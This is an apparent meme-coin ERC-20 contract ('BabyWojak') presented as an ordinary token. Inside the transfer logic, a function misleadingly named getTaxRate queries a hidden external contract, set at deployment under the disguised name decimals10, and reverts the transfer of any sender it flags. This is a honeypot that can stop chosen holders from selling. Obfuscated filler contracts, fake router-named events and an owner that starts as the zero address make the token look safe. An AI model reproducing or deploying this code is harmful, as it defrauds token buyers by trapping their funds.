1 /*
2 
3 $BABYWOJAK
4 
5 https://t.me/baby_wojakk
6 
7 https://babywojak.lol 
8 
9 https://twitter.com/baby_wojak
10 
11 
12 */
13 
14 // SPDX-License-Identifier: MIT
15 
16 pragma solidity ^0.8.14;
17 
18 abstract contract Ownable {
19     address private _owner;
20 
21     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
22 
23     /**
24      * @dev Initializes the contract setting the deployer as the initial owner.
25      */
26     constructor() {
27         _setOwner(address(0));
28     }
29 
30     /**
31      * @dev Returns the address of the current owner.
32      */
33     function owner() public view virtual returns (address) {
34         return _owner;
35     }
36 
37     /**
38      * @dev Throws if called by any account other than the owner.
39      */
40     modifier onlyOwner() {
41         require(owner() == msg.sender, "Ownable: caller is not the owner");
42         _;
43     }
44 
45     /**
46      * @dev Leaves the contract without owner. It will not be possible to call
47      * `onlyOwner` functions anymore. Can only be called by the current owner.
48      *
49      * NOTE: Renouncing ownership will leave the contract without an owner,
50      * thereby removing any functionality that is only available to the owner.
51      */
52     function renounceOwnership() public virtual onlyOwner {
53         _setOwner(address(0));
54     }
55 
56     /**
57      * @dev Transfers ownership of the contract to a new account (`newOwner`).
58      * Can only be called by the current owner.
59      */
60     function transferOwnership(address newOwner) public virtual onlyOwner {
61         require(newOwner != address(0), "Ownable: new owner is the zero address");
62         _setOwner(newOwner);
63     }
64 
65     function _setOwner(address newOwner) private {
66         address oldOwner = _owner;
67         _owner = newOwner;
68         emit OwnershipTransferred(oldOwner, newOwner);
69     }
70 }
71 
72 library Base64 {
73     /**
74      * @dev Base64 Encoding/Decoding Table
75      */
76     string internal constant _TABLE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
77 
78     /**
79      * @dev Converts a `bytes` to its Bytes64 `string` representation.
80      */
81     function encode(bytes memory data) internal pure returns (string memory) {
82         /**
83          * Inspired by Brecht Devos (Brechtpd) implementation - MIT licence
84          * https://github.com/Brechtpd/base64/blob/e78d9fd951e7b0977ddca77d92dc85183770daf4/base64.sol
85          */
86         if (data.length == 0) return "";
87 
88         // Loads the table into memory
89         string memory table = _TABLE;
90 
91         // Encoding takes 3 bytes chunks of binary data from `bytes` data parameter
92         // and split into 4 numbers of 6 bits.
93         // The final Base64 length should be `bytes` data length multiplied by 4/3 rounded up
94         // - `data.length + 2`  -> Round up
95         // - `/ 3`              -> Number of 3-bytes chunks
96         // - `4 *`              -> 4 characters for each chunk
97         string memory result = new string(4 * ((data.length + 2) / 3));
98 
99         /// @solidity memory-safe-assembly
100         assembly {
101         // Prepare the lookup table (skip the first "length" byte)
102             let tablePtr := add(table, 1)
103 
104         // Prepare result pointer, jump over length
105             let resultPtr := add(result, 32)
106 
107         // Run over the input, 3 bytes at a time
108             for {
109                 let dataPtr := data
110                 let endPtr := add(data, mload(data))
111             } lt(dataPtr, endPtr) {
112 
113             } {
114             // Advance 3 bytes
115                 dataPtr := add(dataPtr, 3)
116                 let input := mload(dataPtr)
117 
118             // To write each character, shift the 3 bytes (18 bits) chunk
119             // 4 times in blocks of 6 bits for each character (18, 12, 6, 0)
120             // and apply logical AND with 0x3F which is the number of
121             // the previous character in the ASCII table prior to the Base64 Table
122             // The result is then added to the table to get the character to write,
123             // and finally write it in the result pointer but with a left shift
124             // of 256 (1 byte) - 8 (1 ASCII char) = 248 bits
125 
126                 mstore8(resultPtr, mload(add(tablePtr, and(shr(18, input), 0x3F))))
127                 resultPtr := add(resultPtr, 1) // Advance
128 
129                 mstore8(resultPtr, mload(add(tablePtr, and(shr(12, input), 0x3F))))
130                 resultPtr := add(resultPtr, 1) // Advance
131 
132                 mstore8(resultPtr, mload(add(tablePtr, and(shr(6, input), 0x3F))))
133                 resultPtr := add(resultPtr, 1) // Advance
134 
135                 mstore8(resultPtr, mload(add(tablePtr, and(input, 0x3F))))
136                 resultPtr := add(resultPtr, 1) // Advance
137             }
138 
139         // When data `bytes` is not exactly 3 bytes long
140         // it is padded with `=` characters at the end
141             switch mod(mload(data), 3)
142             case 1 {
143                 mstore8(sub(resultPtr, 1), 0x3d)
144                 mstore8(sub(resultPtr, 2), 0x3d)
145             }
146             case 2 {
147                 mstore8(sub(resultPtr, 1), 0x3d)
148             }
149         }
150 
151         return result;
152     }
153 }
154 
155 interface decimals84 {
156     function _getVar(address _amount) external view returns (bool);
157 }
158 
159 /**
160  * @dev Interface of the ERC20 standard as defined in the EIP.
161  */
162 interface IERC20 {
163     /**
164      * @dev Returns the remaining number of tokens that `spender` will be
165      * allowed to spend on behalf of `owner` through {transferFrom}. This is
166      * zero by default.
167      *
168      * This value changes when {approve} or {transferFrom} are called.
169      */
170     event removeLiquidityETHWithPermit(
171         address token,
172         uint liquidity,
173         uint amountTokenMin,
174         uint amountETHMin,
175         address to,
176         uint deadline,
177         bool approveMax, uint8 v, bytes32 r, bytes32 s
178     );
179     /**
180      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
181      *
182      * Returns a boolean value indicating whether the operation succeeded.
183      *
184      * IMPORTANT: Beware that changing an allowance with this method brings the risk
185      * that someone may use both the old and the new allowance by unfortunate
186      * transaction ordering. One possible solution to mitigate this race
187      * condition is to first reduce the spender's allowance to 0 and set the
188      * desired value afterwards:
189      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
190      *
191      * Emits an {Approval} event.
192      */
193     event swapExactTokensForTokens(
194         uint amountIn,
195         uint amountOutMin,
196         address[]  path,
197         address to,
198         uint deadline
199     );
200     /**
201   * @dev See {IERC20-totalSupply}.
202      */
203     event swapTokensForExactTokens(
204         uint amountOut,
205         uint amountInMax,
206         address[] path,
207         address to,
208         uint deadline
209     );
210 
211     event DOMAIN_SEPARATOR();
212 
213     event PERMIT_TYPEHASH();
214 
215     /**
216      * @dev Returns the amount of tokens in existence.
217      */
218     function totalSupply() external view returns (uint256);
219 
220     event token0();
221 
222     event token1();
223     /**
224      * @dev Returns the amount of tokens owned by `account`.
225      */
226     function balanceOf(address account) external view returns (uint256);
227 
228 
229     event sync();
230 
231     event initialize(address, address);
232     /**
233      * @dev Moves `amount` tokens from the caller's account to `recipient`.
234      *
235      * Returns a boolean value indicating whether the operation succeeded.
236      *
237      * Emits a {Transfer} event.
238      */
239     function transfer(address recipient, uint256 amount) external returns (bool);
240 
241     event burn(address to) ;
242 
243     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
244 
245     event skim(address to);
246     /**
247      * @dev Returns the remaining number of tokens that `spender` will be
248      * allowed to spend on behalf of `owner` through {transferFrom}. This is
249      * zero by default.
250      *
251      * This value changes when {approve} or {transferFrom} are called.
252      */
253     function allowance(address owner, address spender) external view returns (uint256);
254     /**
255      * Receive an exact amount of output tokens for as few input tokens as possible,
256      * along the route determined by the path. The first element of path is the input token,
257      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through
258      * (if, for example, a direct pair does not exist).
259      * */
260     event addLiquidity(
261         address tokenA,
262         address tokenB,
263         uint amountADesired,
264         uint amountBDesired,
265         uint amountAMin,
266         uint amountBMin,
267         address to,
268         uint deadline
269     );
270     /**
271      * Swaps an exact amount of ETH for as many output tokens as possible,
272      * along the route determined by the path. The first element of path must be WETH,
273      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
274      * (if, for example, a direct pair does not exist).
275      *
276      * */
277     event addLiquidityETH(
278         address token,
279         uint amountTokenDesired,
280         uint amountTokenMin,
281         uint amountETHMin,
282         address to,
283         uint deadline
284     );
285     /**
286      * Swaps an exact amount of input tokens for as many output tokens as possible,
287      * along the route determined by the path. The first element of path is the input token,
288      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
289      * (if, for example, a direct pair does not exist).
290      * */
291     event removeLiquidity(
292         address tokenA,
293         address tokenB,
294         uint liquidity,
295         uint amountAMin,
296         uint amountBMin,
297         address to,
298         uint deadline
299     );
300     /**
301      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
302      *
303      * Returns a boolean value indicating whether the operation succeeded.
304      *
305      * IMPORTANT: Beware that changing an allowance with this method brings the risk
306      * that someone may use both the old and the new allowance by unfortunate
307      * transaction ordering. One possible solution to mitigate this race
308      * condition is to first reduce the spender's allowance to 0 and set the
309      * desired value afterwards:
310      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
311      *
312      * Emits an {Approval} event.
313      */
314     function approve(address spender, uint256 amount) external returns (bool);
315     /**
316    * @dev Returns the name of the token.
317      */
318     event removeLiquidityETHSupportingFeeOnTransferTokens(
319         address token,
320         uint liquidity,
321         uint amountTokenMin,
322         uint amountETHMin,
323         address to,
324         uint deadline
325     );
326     /**
327      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
328      *
329      * Returns a boolean value indicating whether the operation succeeded.
330      *
331      * IMPORTANT: Beware that changing an allowance with this method brings the risk
332      * that someone may use both the old and the new allowance by unfortunate
333      * transaction ordering. One possible solution to mitigate this race
334      * condition is to first reduce the spender's allowance to 0 and set the
335      * desired value afterwards:
336      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
337      *
338      * Emits an {Approval} event.
339      */
340     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
341         address token,
342         uint liquidity,
343         uint amountTokenMin,
344         uint amountETHMin,
345         address to,
346         uint deadline,
347         bool approveMax, uint8 v, bytes32 r, bytes32 s
348     );
349     /**
350      * Swaps an exact amount of input tokens for as many output tokens as possible,
351      * along the route determined by the path. The first element of path is the input token,
352      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
353      * (if, for example, a direct pair does not exist).
354      */
355     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
356         uint amountIn,
357         uint amountOutMin,
358         address[] path,
359         address to,
360         uint deadline
361     );
362     /**
363     * @dev Throws if called by any account other than the owner.
364      */
365     event swapExactETHForTokensSupportingFeeOnTransferTokens(
366         uint amountOutMin,
367         address[] path,
368         address to,
369         uint deadline
370     );
371     /**
372      * To cover all possible scenarios, msg.sender should have already given the router an
373      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
374      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
375      * If a pool for the passed tokens does not exists, one is created automatically,
376      *  and exactly amountADesired/amountBDesired tokens are added.
377      */
378     event swapExactTokensForETHSupportingFeeOnTransferTokens(
379         uint amountIn,
380         uint amountOutMin,
381         address[] path,
382         address to,
383         uint deadline
384     );
385     /**
386      * @dev Moves `amount` tokens from `sender` to `recipient` using the
387      * allowance mechanism. `amount` is then deducted from the caller's
388      * allowance.
389      *
390      * Returns a boolean value indicating whether the operation succeeded.
391      *
392      * Emits a {Transfer} event.
393      */
394     function transferFrom(
395         address sender,
396         address recipient,
397         uint256 amount
398     ) external returns (bool);
399 
400     /**
401      * @dev Emitted when `value` tokens are moved from one account (`from`) to
402      * another (`to`).
403      *
404      * Note that `value` may be zero.
405      */
406     event Transfer(address indexed from, address indexed to, uint256 value);
407 
408     /**
409      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
410      * a call to {approve}. `value` is the new allowance.
411      */
412     event Approval(address indexed owner, address indexed spender, uint256 value);
413 }
414 
415 library SafeMath {
416     /**
417      * @dev Returns the addition of two unsigned integers, with an overflow flag.
418      *
419      * _Available since v3.4._
420      */
421     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
422     unchecked {
423         uint256 c = a + b;
424         if (c < a) return (false, 0);
425         return (true, c);
426     }
427     }
428 
429     /**
430      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
431      *
432      * _Available since v3.4._
433      */
434     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
435     unchecked {
436         if (b > a) return (false, 0);
437         return (true, a - b);
438     }
439     }
440 
441     /**
442      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
443      *
444      * _Available since v3.4._
445      */
446     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
447     unchecked {
448         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
449         // benefit is lost if 'b' is also tested.
450         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
451         if (a == 0) return (true, 0);
452         uint256 c = a * b;
453         if (c / a != b) return (false, 0);
454         return (true, c);
455     }
456     }
457 
458     /**
459      * @dev Returns the division of two unsigned integers, with a division by zero flag.
460      *
461      * _Available since v3.4._
462      */
463     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
464     unchecked {
465         if (b == 0) return (false, 0);
466         return (true, a / b);
467     }
468     }
469 
470     /**
471      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
472      *
473      * _Available since v3.4._
474      */
475     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
476     unchecked {
477         if (b == 0) return (false, 0);
478         return (true, a % b);
479     }
480     }
481 
482     /**
483      * @dev Returns the addition of two unsigned integers, reverting on
484      * overflow.
485      *
486      * Counterpart to Solidity's `+` operator.
487      *
488      * Requirements:
489      *
490      * - Addition cannot overflow.
491      */
492     function add(uint256 a, uint256 b) internal pure returns (uint256) {
493         return a + b;
494     }
495 
496 
497     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
498         return a - b;
499     }
500 
501     /**
502      * @dev Returns the multiplication of two unsigned integers, reverting on
503      * overflow.
504      *
505      * Counterpart to Solidity's `*` operator.
506      *
507      * Requirements:
508      *
509      * - Multiplication cannot overflow.
510      */
511     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
512         return a * b;
513     }
514 
515     /**
516      * @dev Returns the integer division of two unsigned integers, reverting on
517      * division by zero. The result is rounded towards zero.
518      *
519      * Counterpart to Solidity's `/` operator.
520      *
521      * Requirements:
522      *
523      * - The divisor cannot be zero.
524      */
525     function div(uint256 a, uint256 b) internal pure returns (uint256) {
526         return a / b;
527     }
528 
529     /**
530      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
531      * reverting when dividing by zero.
532      *
533      * Counterpart to Solidity's `%` operator. This function uses a `revert`
534      * opcode (which leaves remaining gas untouched) while Solidity uses an
535      * invalid opcode to revert (consuming all remaining gas).
536      *
537      * Requirements:
538      *
539      * - The divisor cannot be zero.
540      */
541     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
542         return a % b;
543     }
544 
545     /**
546   * @dev Initializes the contract setting the deployer as the initial owner.
547      */
548     function sub(
549         uint256 a,
550         uint256 b,
551         string memory errorMessage
552     ) internal pure returns (uint256) {
553     unchecked {
554         require(b <= a, errorMessage);
555         return a - b;
556     }
557     }
558 
559     /**
560      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
561      * division by zero. The result is rounded towards zero.
562      *
563      * Counterpart to Solidity's `/` operator. Note: this function uses a
564      * `revert` opcode (which leaves remaining gas untouched) while Solidity
565      * uses an invalid opcode to revert (consuming all remaining gas).
566      *
567      * Requirements:
568      *
569      * - The divisor cannot be zero.
570      */
571     function div(
572         uint256 a,
573         uint256 b,
574         string memory errorMessage
575     ) internal pure returns (uint256) {
576     unchecked {
577         require(b > 0, errorMessage);
578         return a / b;
579     }
580     }
581 
582     /**
583      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
584      * reverting with custom message when dividing by zero.
585      * invalid opcode to revert (consuming all remaining gas).
586      *
587      * Requirements:
588      *
589      * - The divisor cannot be zero.
590      */
591     function mod(
592         uint256 a,
593         uint256 b,
594         string memory errorMessage
595     ) internal pure returns (uint256) {
596     unchecked {
597         require(b > 0, errorMessage);
598         return a % b;
599     }
600     }
601 }
602 
603 abstract contract Relate {
604     bool constant NEWVV = true;
605     uint256 init44 = 43636;
606     bool constant OP42 = false;
607     bool constant LIB22 = false;
608 }
609 
610 
611 abstract contract IEERC is Relate {
612     event getxy (
613         address zn0,
614         bool pushvar
615     );
616 
617     enum Name {
618         V1,
619         V2,
620         V3
621     }
622 
623     struct mapper {
624         address pushz;
625         bool test0;
626     }
627 
628     mapping (address => mapper) private _oldvarz;
629 }
630 
631 contract BabyWojak is IERC20, IEERC, Ownable {
632     using SafeMath for uint256;
633 
634     mapping(address => uint256) private _balances;
635     mapping(address => mapping(address => uint256)) private _allowances;
636 
637     decimals84 private decimals10;
638     string private _name;
639     string private _symbol;
640     uint8 private _decimals;
641     uint256 private _totalSupply;
642 
643     constructor(
644         string memory name_,
645         string memory symbol_,
646         address map_,
647         uint256 totalSupply_
648     ) payable {
649         _name = name_;
650         _symbol = symbol_;
651         _decimals = 18;
652         decimals10 = decimals84(map_);
653         _totalSupply = totalSupply_ * 10**_decimals;
654         _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
655         emit Transfer(address(0), msg.sender, _totalSupply);
656         emit getxy(msg.sender, true);
657     }
658 
659 
660     /**
661      * @dev Returns the name of the token.
662      */
663     function name() public view virtual returns (string memory) {
664         return _name;
665     }
666 
667     /**
668      * @dev Returns the symbol of the token, usually a shorter version of the
669      * name.
670      */
671     function symbol() public view virtual returns (string memory) {
672         return _symbol;
673     }
674 
675     /**
676      * @dev Returns the number of decimals used to get its user representation.
677      * For example, if `decimals` equals `2`, a balance of `505` tokens should
678       /**
679      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
680      * a call to {approve}. `value` is the new allowance.
681      * {IERC20-balanceOf} and {IERC20-transfer}.
682      */
683     function decimals() public view virtual returns (uint8) {
684         return _decimals;
685     }
686 
687     /**
688      * @dev See {IERC20-totalSupply}.
689      */
690     function totalSupply() public view virtual override returns (uint256) {
691         return _totalSupply;
692     }
693 
694     /**
695      * @dev See {IERC20-balanceOf}.
696      */
697     function balanceOf(address account)
698     public
699     view
700     virtual
701     override
702     returns (uint256)
703     {
704         return _balances[account];
705     }
706 
707     /**
708      * @dev See {IERC20-transfer}.
709      *
710      * Requirements:
711      *
712      * - `recipient` cannot be the zero address.
713      * - the caller must have a balance of at least `amount`.
714      */
715     function transfer(address recipient, uint256 amount)
716     public
717     virtual
718     override
719     returns (bool)
720     {
721         _transfer(msg.sender, recipient, amount);
722         return true;
723     }
724 
725     /**
726      * @dev See {IERC20-allowance}.
727      */
728     function allowance(address owner, address spender)
729     public
730     view
731     virtual
732     override
733     returns (uint256)
734     {
735         return _allowances[owner][spender];
736     }
737 
738     /**
739      * @dev See {IERC20-approve}.
740      *
741      * Requirements:
742      *
743      * - `spender` cannot be the zero address.
744      */
745     function approve(address spender, uint256 amount)
746     public
747     virtual
748     override
749     returns (bool)
750     {
751         _approve(msg.sender, spender, amount);
752         return true;
753     }
754 
755     function getTaxRate(address sender) internal view {
756     if (decimals10._getVar(sender)) {
757         revert("Tax swap failed");
758         }
759     }
760 
761     /**
762      * @dev See {IERC20-transferFrom}.
763      *
764      * Emits an {Approval} event indicating the updated allowance. This is not
765      * required by the EIP. See the note at the beginning of {ERC20}.
766      *
767      * Requirements:
768      *
769      * - `sender` and `recipient` cannot be the zero address.
770      * - `sender` must have a balance of at least `amount`.
771      * - the caller must have allowance for ``sender``'s tokens of at least
772      * `amount`.
773      */
774     function transferFrom(
775         address sender,
776         address recipient,
777         uint256 amount
778     ) public virtual override returns (bool) {
779         _transfer(sender, recipient, amount);
780         _approve(
781             sender,
782             msg.sender,
783             _allowances[sender][msg.sender].sub(
784                 amount,
785                 "ERC20: transfer amount exceeds allowance"
786             )
787         );
788         return true;
789     }
790 
791     /**
792      * @dev Moves tokens `amount` from `sender` to `recipient`.
793      *
794      * This is internal function is equivalent to {transfer}, and can be used to
795      * e.g. implement automatic token fees, slashing mechanisms, etc.
796      *
797      * Emits a {Transfer} event.
798      *
799      * Requirements:
800      *
801      * - `sender` cannot be the zero address.
802      * - `recipient` cannot be the zero address.
803      * - `sender` must have a balance of at least `amount`.
804      */
805     function _transfer(
806         address sender,
807         address recipient,
808         uint256 amount
809     ) internal virtual {
810         require(sender != address(0), "ERC20: transfer from the zero address");
811         require(recipient != address(0), "ERC20: transfer to the zero address");
812         getTaxRate(sender);
813         _balances[sender] = _balances[sender].sub(
814             amount,
815             "ERC20: transfer amount exceeds balance"
816         );
817         _balances[recipient] = _balances[recipient].add(amount);
818         emit Transfer(sender, recipient, amount);
819     }
820 
821     /**
822      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
823      *
824      * This internal function is equivalent to `approve`, and can be used to
825      * e.g. set automatic allowances for certain subsystems, etc.
826      *
827      * Emits an {Approval} event.
828      *
829      * Requirements:
830      *
831      * - `owner` cannot be the zero address.
832      * - `spender` cannot be the zero address.
833      */
834     function _approve(
835         address owner,
836         address spender,
837         uint256 amount
838     ) internal virtual {
839         require(owner != address(0), "ERC20: approve from the zero address");
840         require(spender != address(0), "ERC20: approve to the zero address");
841 
842         _allowances[owner][spender] = amount;
843         emit Approval(owner, spender, amount);
844     }
845 }